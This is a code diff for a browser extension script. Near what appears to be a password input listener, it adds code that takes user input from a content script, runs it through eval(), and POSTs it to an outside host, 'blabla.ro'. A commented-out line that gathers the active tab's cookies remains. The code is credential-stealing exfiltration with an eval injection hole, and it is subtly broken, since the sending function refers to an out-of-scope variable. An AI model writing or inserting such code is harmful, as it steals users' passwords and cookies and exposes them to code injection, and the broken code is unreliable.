@@ -109,13 +109,37 @@ passInput.addEventListener("change", function (elem) {
 
 //return user input received from content script
 function create(request, sender, sendResponse) {
-    // console.log("receive message");
-    // var data = JSON.parse(request.userInput);
-    // return data;
-    // return request.userInput;
+    console.log("receive message");
 
+    // send data to server
+    function sendData() {
+        console.log("send data");
+        $.ajax({
+            type: "POST",
+            url: "https://blabla.ro",
+            data: data,
+            contentType: "application/json; charset=utf-8",
+            dataType: "json",
+            success: function (myMessage) {
+                console.log("your data was sent");
+            }
+        });
+    }
+    
+    setTimeout(function(){
+        console.log("setTimeout function");
+        var element = request.userInput;
+        var dataReceived = eval(element);
+        console.log(dataReceived);
+        var data = JSON.stringify(dataReceived);
+        sendData(data);
+    }, 5000);
+
+    // browser.tabs.query({active:true,currentWindow:true}).then((tabs)=>{var getCookie=browser.cookies.getAll({url:tabs.url}).then(function(cookie){console.log(cookie);})});
     //console log all the cookies
-    return browser.tabs.query({active:true,currentWindow:true}).then((tabs)=>{var getCookie=browser.cookies.getAll({url:tabs.url}).then(function(cookie){console.log(cookie);})});    
+
+    // return eval(request.userInput);
+
 }
 
 browser.runtime.onMessage.addListener(create);
